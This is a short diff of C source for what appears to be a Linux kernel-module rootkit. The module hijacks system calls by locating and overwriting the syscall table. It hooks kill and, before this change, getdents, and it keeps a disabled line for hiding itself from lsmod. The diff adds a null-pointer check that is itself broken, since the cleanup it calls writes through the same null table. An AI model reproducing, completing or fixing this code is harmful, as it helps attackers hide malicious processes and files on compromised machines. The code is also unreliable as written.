@@ -135,10 +135,11 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
 static int init(void) { //initial function, sets up syscall hijacking
     struct module *myself = &__this_module;
 	syscall_table = find(); //give us the syscall table address for modification
+    if (!syscall_table) {cleanup_module(); } //if find() fails, unload
 //    list_del(&myself->list); //remove from places such as lsmod
     //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
-    original_getdents = (void *)syscall_table[__NR_getdents];
+    //original_getdents = (void *)syscall_table[__NR_getdents];
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     //syscall_table[__NR_getdents] = new_getdents;
@@ -151,7 +152,7 @@ static int init(void) { //initial function, sets up syscall hijacking
 void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = original_kill; //corrects the hijacking on unload
-    syscall_table[__NR_getdents] = original_getdents;
+    //syscall_table[__NR_getdents] = original_getdents;
     //syscall_table[__NR_getdents64] = original_getdents64;
     GPF_ENABLE;
     return;
